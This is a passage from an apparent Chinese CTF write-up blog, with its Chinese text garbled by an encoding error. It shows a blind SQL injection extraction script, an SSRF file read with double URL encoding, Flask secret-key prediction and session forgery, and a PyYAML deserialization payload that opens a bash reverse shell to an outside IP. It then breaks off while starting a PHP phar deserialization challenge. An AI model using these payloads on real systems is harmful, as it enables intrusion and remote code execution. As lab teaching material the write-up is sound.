class="line">tarnish&#x27;&amp;&amp;(ascii(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28905/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;tarnish&#x27;&amp;&amp;(ascii(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;&#125;,1))&gt;&#123;&#125;)&amp;&amp;/**/&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;700253f7-9510-4244-a934-a68ed47bbff4&#125;</span><br></pre></td></tr></table></figure><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183506892.png" alt="image-20241204183506892"></p><p>æ‰“å¼€å‘ç°æœ‰ä¸‰ä¸ªåŠŸèƒ½ç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯ssrfä¸€æ ·çš„å­˜åœ¨ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œç¬¬ä¸‰ä¸ªæ˜¯pwd</p><p>å…ˆæµ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ª</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183619864.png" alt="image-20241204183619864"></p><p>oké‚£è¯»ä¸€ä¸‹æºç å˜›ï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183641915.png" alt="image-20241204183641915"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.*</span><br></pre></td></tr></table></figure><p>è¢«è¿‡æ»¤äº†ï¼ï¼ï¼äºŒæ¬¡urlç¼–ç æ¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28466/read?url=file:///%2561pp/%2561pp.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml <span class="comment">#é—®é¢˜æ‰€åœ¨ pyyamlååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST = [<span class="string">&quot;yaml&quot;</span>, <span class="string">&quot;YAML&quot;</span>, <span class="string">&quot;YML&quot;</span>, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¤šäº†ä¸€ä¸ªè·¯ç”±ï¼Œæˆ‘æ€ä¹ˆæ„Ÿè§‰é™¤äº†pwdï¼Œå…¶ä»–ä¸‰ä¸ªè·¯ç”±éƒ½æœ‰æ´å•Šï¼ï¼ï¼</p><p>&#x2F;readå¯èƒ½ç›´æ¥è¯»å–åˆ°flagï¼Œè¿™é‡Œæœ‰ä¸ªéé¢„æœŸï¼Œç›´æ¥è¯»file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environç›´æ¥å‡ºäº†flag</p><p>&#x2F;uploadä¸­æœ‰os.path.joinï¼Œå¯èƒ½é€ æˆç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><p>å¦‚æœflagåœ¨æ ¹ç›®å½•ä¸‹ä¸”åç§°çŸ¥é“ï¼Œé‚£ä¹ˆå°±æ‹¿ä¸‹äº†</p><p><strong>ä½†æ˜¯</strong>ï¼Œç”±äºæ­¤å¤„å­˜åœ¨secure_filenameå‡½æ•°ï¼Œæ‰€ä»¥å°±ä¸è¡Œå•¦ï¼ï¼</p><p>å†çœ‹çœ‹&#x2F;boogipopè·¯ç”±ï¼Œyaml.full_load(f)ï¼Œå¯èƒ½å­˜åœ¨PyYamlååºåˆ—åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œæˆ‘ä»¬é¢ä¸´çš„æ˜¯sessionä¼ªé€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random() * 233)</span><br></pre></td></tr></table></figure><p>æ³¨æ„çœ‹è¿™é‡Œçš„uuid.getnode()ï¼Œ<code>uuid.getnode()</code> è¿”å›è®¡ç®—æœºçš„<strong>ç½‘ç»œæ¥å£å¡ï¼ˆNICï¼‰åœ°å€</strong>ï¼Œé€šå¸¸æ˜¯è®¾å¤‡çš„ MAC åœ°å€ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204190138226.png" alt="image-20241204190138226" style="zoom:80%;" /><p>å°è¯•ä¸€ä¸‹è¯»å–file:&#x2F;&#x2F;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>æˆåŠŸè¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:53:60 </span><br></pre></td></tr></table></figure><p>é‚£æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨pythonè·‘ä¸€ä¸‹secret_key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac025360</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#186.07856094331362</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.Z1A35A.Asx0C_ayFAFrjis7qY4WWiXNYEU</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191236394.png" alt="image-20241204191236394"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.Z1A5HQ.XcVLAuoOz8HI6SqclVREZ0FH3dE</span><br></pre></td></tr></table></figure><p>&#x2F;boogipopè·¯ç”±ä¸‹å¹²çš„å…¶å®å°±æ˜¯æ¥æ”¶ä¸€ä¸ªfileï¼Œç„¶åå®ƒä¼šå»æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™yaml.full_load<br>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆå»ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„yamlæ–‡ä»¶</p><p>ç”±äºè¿™é‡Œæ˜¯full_load()</p><p>æˆ‘ä»¬è¦æƒ³åŠæ³•å»çªç ´ï¼Œç”¨extendæ–¹æ³•è¯•è¯•åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:type</span><br><span class="line">args:</span><br><span class="line">  - exp</span><br><span class="line">  - !!python/tuple []</span><br><span class="line">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="line">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª1.txtå°±å¥½äº†ï¼Œå…¶ä»–åç¼€éƒ½è¢«è¿‡æ»¤äº†</p><p>ä¸Šä¼ åˆ°&#x2F;uploads&#x2F;1.txt</p><p>ç„¶ååˆ°&#x2F;boogipopè·¯ç”±ä¸‹è¿›è¡Œååºåˆ—åŒ–å³å¯ï¼Œè¿™é‡Œæ³¨æ„æ”¹session</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191947252.png" alt="image-20241204191947252" style="zoom:80%;" /><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204192022368.png" alt="image-20241204192022368"></p><p>çŸ¥è¯†ç‚¹æŒºå¤šçš„ï¼Œè¿˜æ˜¯éå¸¸é€‚åˆå­¦ä¹ çš„ï¼ï¼</p><h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-babyunser"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-babyunser" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser</h2><p>æ‰“å¼€å°±ä¸¤ä¸ªåŠŸèƒ½ç‚¹</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205101557977.png" alt="image-20241205101557977" style="zoom:80%;" /><p>ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶ï¼Œä¸€ä¸ªæŸ¥çœ‹æ–‡ä»¶</p><p>æ ¹æ®é¢˜ç›®å°±çŸ¥é“ä¸ååºåˆ—åŒ–æœ‰å…³ï¼Œphpæ¶æ„ï¼ŒçŒœæµ‹ä¸ºpharååºåˆ—åŒ–ã€‚</p><p>å…ˆæ‰«ç›®å½•çœ‹çœ‹</p><p>æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ã€‚</p><p>é‚£ä¹ˆçœ‹çœ‹æŸ¥çœ‹æ–‡ä»¶è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œå¯èƒ½å’Œä»»æ„æ–‡ä»¶è¯»å–æœ‰å…³</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205102042424.png" alt="image-20241205102042424" style="zoom: 80%;" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">include(&#x27;class.php&#x27;);</span></span><br><span class="line"><span class="meta">$a=new aa();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aaçš„æ–‡ä»¶æŸ¥çœ‹å™¨<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;search_form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥æœç´¢å†…å®¹&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æŸ¥çœ‹&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_sub&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">error_reporting(0);</span></span><br><span class="line"><span class="meta">$filename=$_POST[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(!isset($filename))&#123;</span></span><br><span class="line"><span class="meta">    die();</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">$file=new zz($filename);</span></span><br><span class="line"><span class="meta">$contents=$file-&gt;getFile();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;file_content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=&lt;?<span class="attr">php</span> <span class="attr">echo</span> &quot;&lt;<span class="attr">br</span>&gt;</span>&quot;.$contents;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡Œé¢åŒ…å«äº†class.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬å†è¯»å–ä¸€ä¸‹class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span 